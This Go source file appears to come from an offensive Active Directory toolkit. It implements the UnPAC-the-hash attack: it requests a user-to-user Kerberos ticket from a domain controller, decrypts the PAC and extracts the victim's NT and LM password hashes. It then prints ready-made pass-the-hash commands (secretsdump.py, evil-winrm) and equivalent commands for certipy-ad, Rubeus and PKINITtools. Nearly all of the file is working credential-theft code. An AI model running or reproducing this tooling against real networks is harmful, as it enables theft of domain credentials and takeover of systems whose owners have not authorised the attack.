package pki

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"strings"
	"time"

	krbcrypto "github.com/jcmturner/gokrb5/v8/crypto"
	"github.com/jcmturner/gokrb5/v8/iana/keyusage"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
)

// ────────────────────────────────────────────────────────────────────────────
// UnPAC-the-hash — Real Implementation
// ────────────────────────────────────────────────────────────────────────────

// UnPACConfig holds parameters for UnPAC-the-hash extraction.
type UnPACConfig struct {
	// TGT obtained from PKINIT
	TGTRaw     []byte // Raw DER-encoded Ticket
	SessionKey []byte // TGT session key bytes
	Etype      int32  // Session key encryption type

	// PKINIT reply key (used to decrypt PAC_CREDENTIAL_INFO)
	ReplyKey   []byte
	ReplyEtype int32

	// Target
	DC       string // KDC hostname or IP
	Domain   string // Kerberos realm
	Username string // sAMAccountName
}

// UnPACResult holds the recovered credentials.
type UnPACResult struct {
	NTHash string // Hex-encoded NT hash
	LMHash string // Hex-encoded LM hash (if available)
}

// UnPACTheHash performs the UnPAC-the-hash attack to extract the NT hash from
// a PKINIT-obtained TGT.
//
// Flow: send a U2U TGS-REQ (service ticket to self, encrypted with TGT session
// key), decrypt the PAC, and extract PAC_CREDENTIAL_INFO which contains the
// NTLM hash encrypted with the PKINIT AS-REP reply key.
func UnPACTheHash(cfg *UnPACConfig) (*UnPACResult, error) {
	realm := strings.ToUpper(cfg.Domain)
	fmt.Printf("[*] UnPAC-the-hash: extracting NT hash for %s@%s\n", cfg.Username, realm)

	// Parse the TGT ticket
	var tgt messages.Ticket
	if err := tgt.Unmarshal(cfg.TGTRaw); err != nil {
		return nil, fmt.Errorf("unmarshal TGT: %w", err)
	}

	// Build Kerberos config
	krb5Cfg, err := buildKrb5Config(&ADCSConfig{
		TargetDC: cfg.DC,
		Domain:   cfg.Domain,
	})
	if err != nil {
		return nil, fmt.Errorf("build krb5 config: %w", err)
	}

	// Build session key
	sessionKey := types.EncryptionKey{
		KeyType:  cfg.Etype,
		KeyValue: cfg.SessionKey,
	}

	// Client and service principal
	cname := types.PrincipalName{
		NameType:   krbNameTypePrincipal,
		NameString: []string{normalizeUsername(cfg.Username)},
	}
	sname := types.PrincipalName{
		NameType:   krbNameTypePrincipal,
		NameString: []string{normalizeUsername(cfg.Username)},
	}

	// Build U2U TGS-REQ
	tgsReq, err := messages.NewUser2UserTGSReq(
		cname, realm, krb5Cfg,
		tgt, sessionKey,
		sname, false, tgt, // verifyingTGT = our own TGT (U2U to self)
	)
	if err != nil {
		return nil, fmt.Errorf("build U2U TGS-REQ: %w", err)
	}

	// Marshal and send
	tgsReqBytes, err := tgsReq.Marshal()
	if err != nil {
		return nil, fmt.Errorf("marshal TGS-REQ: %w", err)
	}

	fmt.Printf("[*] Sending U2U TGS-REQ (%d bytes)...\n", len(tgsReqBytes))
	respBytes, err := sendKDCRequest(cfg.DC, tgsReqBytes)
	if err != nil {
		return nil, fmt.Errorf("KDC request: %w", err)
	}

	// Check for KRB-ERROR
	if err := checkKRBError(respBytes); err != nil {
		return nil, fmt.Errorf("U2U TGS: %w", err)
	}

	// Parse TGS-REP
	var tgsRep messages.TGSRep
	if err := tgsRep.Unmarshal(respBytes); err != nil {
		return nil, fmt.Errorf("unmarshal TGS-REP: %w", err)
	}
	fmt.Printf("[+] Received U2U TGS-REP\n")

	// Decrypt TGS-REP enc-part with session key (usage 8 = TGS-REP)
	if err := tgsRep.DecryptEncPart(sessionKey); err != nil {
		return nil, fmt.Errorf("decrypt TGS-REP enc-part: %w", err)
	}

	// The service ticket enc-part is encrypted with the TGT session key
	// (since this is U2U, the additional ticket's session key is used)
	if err := tgsRep.Ticket.Decrypt(sessionKey); err != nil {
		return nil, fmt.Errorf("decrypt service ticket: %w", err)
	}

	// Extract PAC from authorization data
	pacData, err := extractPACFromAuthData(tgsRep.Ticket.DecryptedEncPart.AuthorizationData)
	if err != nil {
		return nil, fmt.Errorf("extract PAC: %w", err)
	}
	fmt.Printf("[+] Extracted PAC (%d bytes)\n", len(pacData))

	// Parse PAC and find PAC_CREDENTIAL_INFO (type 2)
	credInfoBytes, err := extractPACCredentialInfo(pacData)
	if err != nil {
		return nil, fmt.Errorf("extract PAC_CREDENTIAL_INFO: %w", err)
	}
	fmt.Printf("[+] Found PAC_CREDENTIAL_INFO (%d bytes)\n", len(credInfoBytes))

	// Decrypt PAC_CREDENTIAL_INFO with the PKINIT reply key
	replyKey := types.EncryptionKey{
		KeyType:  cfg.ReplyEtype,
		KeyValue: cfg.ReplyKey,
	}

	ntHash, lmHash, err := decryptCredentialInfo(credInfoBytes, replyKey)
	if err != nil {
		return nil, fmt.Errorf("decrypt credentials: %w", err)
	}

	result := &UnPACResult{
		NTHash: hex.EncodeToString(ntHash),
	}
	if len(lmHash) > 0 {
		result.LMHash = hex.EncodeToString(lmHash)
	}

	fmt.Printf("[+] NT Hash: %s\n", result.NTHash)
	if result.LMHash != "" {
		fmt.Printf("[+] LM Hash: %s\n", result.LMHash)
	}

	fmt.Println()
	fmt.Println("[+] Pass-the-hash:")
	fmt.Printf("    secretsdump.py -hashes :%s %s/%s@%s\n", result.NTHash, cfg.Domain, cfg.Username, cfg.Domain)
	fmt.Printf("    evil-winrm -i %s -u %s -H %s\n", cfg.DC, cfg.Username, result.NTHash)

	return result, nil
}

// ────────────────────────────────────────────────────────────────────────────
// PAC Extraction
// ────────────────────────────────────────────────────────────────────────────

// extractPACFromAuthData walks the authorization data to find the AD-WIN2K-PAC
// (type 128) blob, potentially nested inside AD-IF-RELEVANT (type 1).
func extractPACFromAuthData(authData types.AuthorizationData) ([]byte, error) {
	for _, entry := range authData {
		switch entry.ADType {
		case 128: // AD-WIN2K-PAC directly
			return entry.ADData, nil
		case 1: // AD-IF-RELEVANT — contains nested AuthorizationData
			var nested types.AuthorizationData
			if err := nested.Unmarshal(entry.ADData); err != nil {
				continue // try next entry
			}
			for _, inner := range nested {
				if inner.ADType == 128 {
					return inner.ADData, nil
				}
			}
		}
	}
	return nil, fmt.Errorf("no AD-WIN2K-PAC (type 128) found in authorization data")
}

// extractPACCredentialInfo parses the PACTYPE structure to find the
// PAC_CREDENTIAL_INFO buffer (type 2).
//
// PACTYPE format:
//
//	cBuffers  (4 bytes LE)
//	Version   (4 bytes LE, must be 0)
//	Buffers[] (array of PAC_INFO_BUFFER):
//	    ulType       (4 bytes LE)
//	    cbBufferSize (4 bytes LE)
//	    Offset       (8 bytes LE)
func extractPACCredentialInfo(pacData []byte) ([]byte, error) {
	if len(pacData) < 8 {
		return nil, fmt.Errorf("PAC too short: %d bytes", len(pacData))
	}

	r := bytes.NewReader(pacData)

	var cBuffers, version uint32
	binary.Read(r, binary.LittleEndian, &cBuffers)
	binary.Read(r, binary.LittleEndian, &version)

	if version != 0 {
		return nil, fmt.Errorf("unexpected PACTYPE version: %d", version)
	}

	for i := uint32(0); i < cBuffers; i++ {
		var ulType, cbBufferSize uint32
		var offset uint64

		if err := binary.Read(r, binary.LittleEndian, &ulType); err != nil {
			return nil, fmt.Errorf("read PAC buffer %d type: %w", i, err)
		}
		if err := binary.Read(r, binary.LittleEndian, &cbBufferSize); err != nil {
			return nil, fmt.Errorf("read PAC buffer %d size: %w", i, err)
		}
		if err := binary.Read(r, binary.LittleEndian, &offset); err != nil {
			return nil, fmt.Errorf("read PAC buffer %d offset: %w", i, err)
		}

		if ulType == 2 { // PAC_CREDENTIAL_INFO
			if int(offset)+int(cbBufferSize) > len(pacData) {
				return nil, fmt.Errorf("PAC_CREDENTIAL_INFO offset/size out of bounds: off=%d size=%d total=%d",
					offset, cbBufferSize, len(pacData))
			}
			return pacData[offset : offset+uint64(cbBufferSize)], nil
		}
	}

	return nil, fmt.Errorf("no PAC_CREDENTIAL_INFO (type 2) found — KDC may not include credentials in this ticket type")
}

// decryptCredentialInfo decrypts a PAC_CREDENTIAL_INFO buffer and extracts
// the NTLM hash from the NTLM_SUPPLEMENTAL_CREDENTIAL entry.
//
// PAC_CREDENTIAL_INFO:
//
//	Version        (4 bytes LE, must be 0)
//	EncryptionType (4 bytes LE)
//	SerializedData (remaining bytes, encrypted with AS reply key)
//
// After decryption, the result is NDR-encoded PAC_CREDENTIAL_DATA containing
// SECPKG_SUPPLEMENTAL_CRED entries with NTLM credentials.
func decryptCredentialInfo(data []byte, replyKey types.EncryptionKey) (ntHash, lmHash []byte, err error) {
	if len(data) < 8 {
		return nil, nil, fmt.Errorf("PAC_CREDENTIAL_INFO too short: %d bytes", len(data))
	}

	version := binary.LittleEndian.Uint32(data[0:4])
	if version != 0 {
		return nil, nil, fmt.Errorf("PAC_CREDENTIAL_INFO version %d (expected 0)", version)
	}

	encType := int32(binary.LittleEndian.Uint32(data[4:8]))
	encData := data[8:]

	if encType != replyKey.KeyType {
		return nil, nil, fmt.Errorf("PAC_CREDENTIAL_INFO etype %d doesn't match reply key etype %d", encType, replyKey.KeyType)
	}

	// Decrypt with KERB_NON_KERB_SALT usage (16)
	plaintext, err := krbcrypto.DecryptMessage(encData, replyKey, uint32(keyusage.KERB_NON_KERB_SALT))
	if err != nil {
		return nil, nil, fmt.Errorf("decrypt PAC credentials: %w", err)
	}

	// Parse PAC_CREDENTIAL_DATA (NDR-encoded)
	// Simplified parsing: look for NTLM_SUPPLEMENTAL_CREDENTIAL directly
	ntHash, lmHash, err = parseCredentialData(plaintext)
	if err != nil {
		return nil, nil, fmt.Errorf("parse credential data: %w", err)
	}

	return ntHash, lmHash, nil
}

// parseCredentialData parses NDR-encoded PAC_CREDENTIAL_DATA to extract
// NTLM hashes. Handles both full NDR decoding and simplified byte scanning.
//
// PAC_CREDENTIAL_DATA:
//
//	CredentialCount (4 bytes LE)
//	Credentials[] (SECPKG_SUPPLEMENTAL_CRED):
//	    PackageName (RPC_UNICODE_STRING: Length, MaxLength, pointer)
//	    CredentialSize (4 bytes LE)
//	    Credentials (pointer → CredentialSize bytes)
//
// NTLM_SUPPLEMENTAL_CREDENTIAL:
//
//	Version    (4 bytes LE, must be 0)
//	Flags      (4 bytes LE)
//	LmPassword (16 bytes)
//	NtPassword (16 bytes)
func parseCredentialData(data []byte) (ntHash, lmHash []byte, err error) {
	if len(data) < 4 {
		return nil, nil, fmt.Errorf("credential data too short")
	}

	// NDR stream: skip conformance header if present
	// The NDR top-level structure starts with conformant array max_count for pointers
	// Try to find the NTLM_SUPPLEMENTAL_CREDENTIAL by looking for the pattern:
	// Version=0 (4 bytes), Flags (4 bytes), LmPassword (16 bytes), NtPassword (16 bytes)
	// Total = 40 bytes, and it appears at a pointer offset in the NDR stream.

	// Strategy: look for the NTLM package name "NTLM" in UTF-16LE, then find the
	// credential blob that follows the pointer chain.
	ntlmMarker := encodeUTF16LE("NTLM")

	idx := bytes.Index(data, ntlmMarker)
	if idx < 0 {
		return nil, nil, fmt.Errorf("NTLM package name not found in credential data")
	}

	// The NTLM_SUPPLEMENTAL_CREDENTIAL blob is typically after all the string data
	// in the NDR deferred pointers section. Search for Version=0 pattern after the marker.
	searchStart := idx + len(ntlmMarker)
	for i := searchStart; i+40 <= len(data); i++ {
		ver := binary.LittleEndian.Uint32(data[i : i+4])
		if ver != 0 {
			continue
		}
		// flags := binary.LittleEndian.Uint32(data[i+4 : i+8])
		candidateLM := data[i+8 : i+24]
		candidateNT := data[i+24 : i+40]

		// Basic validation: at least one hash should be non-zero
		allZeroNT := true
		for _, b := range candidateNT {
			if b != 0 {
				allZeroNT = false
				break
			}
		}

		if !allZeroNT {
			ntHash = make([]byte, 16)
			copy(ntHash, candidateNT)
			lmHash = make([]byte, 16)
			copy(lmHash, candidateLM)
			return ntHash, lmHash, nil
		}
	}

	return nil, nil, fmt.Errorf("could not locate NTLM_SUPPLEMENTAL_CREDENTIAL in PAC data")
}

func encodeUTF16LE(s string) []byte {
	b := make([]byte, len(s)*2)
	for i, c := range s {
		b[i*2] = byte(c)
		b[i*2+1] = 0
	}
	return b
}

// ────────────────────────────────────────────────────────────────────────────
// Legacy Guidance Functions
// ────────────────────────────────────────────────────────────────────────────

// PrintUnPACGuidance prints external-tool commands for UnPAC-the-hash.
// Use UnPACTheHash() for real built-in extraction; this prints commands for
// certipy-ad, Rubeus, and PKINITtools as a reference.
func PrintUnPACGuidance(pfxPath, pfxPass, dc, domain, upn string) {
	user := upn
	if idx := strings.Index(user, "@"); idx > 0 {
		user = user[:idx]
	}

	fmt.Println("[*] UnPAC-the-Hash commands (external tools):")

	fmt.Println("    # certipy-ad (performs PKINIT + UnPAC in one step)")
	fmt.Printf("    certipy-ad auth -pfx %s -dc-ip <DC_IP> -domain %s\n", pfxPath, domain)
	fmt.Println("    # Look for 'Got hash' in output")

	fmt.Println("    # Rubeus (Windows — requests TGT + extracts credentials)")
	rubeusCmd := fmt.Sprintf("Rubeus.exe asktgt /user:%s /certificate:%s /getcredentials /show /nowrap", user, pfxPath)
	if pfxPass != "" {
		rubeusCmd += fmt.Sprintf(" /password:%s", pfxPass)
	}
	fmt.Printf("    %s\n", rubeusCmd)
	fmt.Println("    # Look for 'NTLM' hash in credential info")

	fmt.Println("    # PKINITtools (Python)")
	fmt.Printf("    python gettgtpkinit.py %s/%s %s.ccache -cert-pfx %s -pfx-pass '%s'\n", domain, user, user, pfxPath, pfxPass)
	fmt.Printf("    python getnthash.py %s/%s -key <AS-REP-key>\n\n", domain, user)

	fmt.Println("    # After obtaining NT hash, pass-the-hash:")
	fmt.Printf("    secretsdump.py -hashes :<NTHASH> %s/%s@%s\n", domain, user, domain)
	fmt.Printf("    evil-winrm -i <DC_IP> -u %s -H <NTHASH>\n", user)
}

// PrintUnPACCommands is a compatibility alias for PrintUnPACGuidance.
func PrintUnPACCommands(pfxPath, pfxPass, dc, domain, upn string) {
	PrintUnPACGuidance(pfxPath, pfxPass, dc, domain, upn)
}

// Unused import guards
var (
	_ = time.Now
)
